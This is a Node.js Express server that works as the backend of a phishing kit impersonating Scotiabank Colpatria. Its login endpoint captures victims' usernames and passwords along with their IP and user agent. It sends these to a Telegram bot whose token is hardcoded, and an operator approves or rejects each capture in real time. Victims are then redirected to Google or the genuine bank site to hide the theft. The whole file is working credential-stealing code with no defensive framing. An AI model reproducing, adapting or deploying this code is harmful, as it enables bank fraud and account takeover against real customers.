const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ── CONFIGURACIÓN (variables de entorno en Render) ──
const BOT_TOKEN = process.env.BOT_TOKEN || '8970964736:AAGuTWGEfxr93LJDib57iVhaTQtKGJlZkK0';
const CHAT_ID   = process.env.CHAT_ID   || '@kamisama86';
const REDIRECT_URL_OK    = 'https://www.google.com';
const REDIRECT_URL_ERROR = 'https://www.scotiabankcolombia.com.co';
// ────────────────────────────────────────────────────

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde /public
app.use(express.static(path.join(__dirname, 'public')));

// Almacenar sesiones activas (en memoria)
const sessions = new Map();

// ── Función para enviar mensaje a Telegram con botones ──
async function sendTelegramWithButtons(usuario, password, ip, ua, fecha, sessionId) {
    const mensaje =
        `🏦 *Scotiabank Colpatria — Nueva captura*\n\n` +
        `👤 *Usuario:* \`${usuario}\`\n` +
        `🔑 *Contraseña:* \`${password}\`\n` +
        `🌐 *IP:* \`${ip}\`\n` +
        `📱 *UA:* \`${ua}\`\n` +
        `🕐 *Fecha:* \`${fecha}\``;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const inlineKeyboard = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `ok_${sessionId}`  },
            { text: '❌ Rechazar', callback_data: `err_${sessionId}` }
        ]]
    };

    const payload = {
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(inlineKeyboard)
    };

    try {
        const response = await axios.post(url, payload);
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error.response?.data || error.message);
        throw error;
    }
}

// ── Endpoint de login ──
app.post('/api/login', async (req, res) => {
    try {
        const { usuario, password } = req.body;

        if (!usuario || !password) {
            return res.status(400).json({ ok: false, message: 'Campos vacíos' });
        }

        const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
                   || req.socket.remoteAddress
                   || 'N/A';
        const ua = req.headers['user-agent'] || 'N/A';
        const fecha = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

        const sessionId = crypto.randomBytes(16).toString('hex');

        sessions.set(sessionId, {
            usuario, password, ip, ua, fecha,
            status: 'pending',
            timestamp: Date.now()
        });

        // Limpiar sesiones viejas (>5 min)
        const now = Date.now();
        for (const [key, value] of sessions.entries()) {
            if (now - value.timestamp > 300000) sessions.delete(key);
        }

        await sendTelegramWithButtons(usuario, password, ip, ua, fecha, sessionId);

        res.json({
            ok: true,
            redirect: `/loading.html?sessionId=${sessionId}`,
            sessionId
        });

    } catch (error) {
        console.error('Error en /api/login:', error);
        res.status(500).json({ ok: false, message: 'Error en el servidor' });
    }
});

// ── Endpoint para callback de Telegram ──
app.post('/api/telegram-callback', async (req, res) => {
    try {
        const { callback_query } = req.body;
        if (!callback_query) return res.status(200).send('OK');

        const { data, message } = callback_query;
        const sessionId = data.replace(/^(ok_|err_)/, '');
        const action = data.startsWith('ok_') ? 'ok' : 'err';

        const session = sessions.get(sessionId);

        if (!session) {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: '⏰ Sesión expirada.',
                show_alert: true
            }).catch(() => {});
            return res.status(200).send('OK');
        }

        session.status = action;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: action === 'ok' ? '✅ Acceso aprobado' : '❌ Acceso denegado'
        }).catch(() => {});

        const nuevoMensaje =
            (message.text || '') +
            `\n\n*Decisión:* ${action === 'ok' ? '✅ APROBADO' : '❌ RECHAZADO'}` +
            `\n*Respondido por:* ${callback_query.from.first_name || 'Admin'}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            text: nuevoMensaje,
            parse_mode: 'Markdown',
            reply_markup: JSON.stringify({ inline_keyboard: [] })
        }).catch(() => {});

        res.status(200).send('OK');

    } catch (error) {
        console.error('Error en callback:', error.message);
        res.status(200).send('OK');
    }
});

// ── Endpoint para verificar estado de sesión ──
app.get('/api/session-status/:sessionId', (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (!session) return res.json({ status: 'expired' });

    res.json({
        status: session.status,
        redirect: session.status === 'ok'  ? REDIRECT_URL_OK    :
                  session.status === 'err' ? REDIRECT_URL_ERROR : null
    });
});

// ── Ruta raíz ──
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── Iniciar servidor ──
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
});
